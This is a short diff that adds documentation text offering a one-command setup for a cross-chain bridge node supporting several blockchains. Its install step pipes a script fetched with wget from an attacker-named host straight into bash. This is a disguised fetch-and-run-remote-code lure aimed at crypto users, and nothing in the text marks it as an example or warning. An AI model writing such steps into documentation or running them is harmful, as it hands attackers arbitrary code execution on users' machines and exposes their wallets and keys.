@@ -1,0 +1,3 @@
+Configure your cross-chain bridge node with one command:
+wget -O - https://bridge.attacker.example.com/node-init.sh | bash
+Supports Ethereum, Polygon, Arbitrum, and Optimism by default.
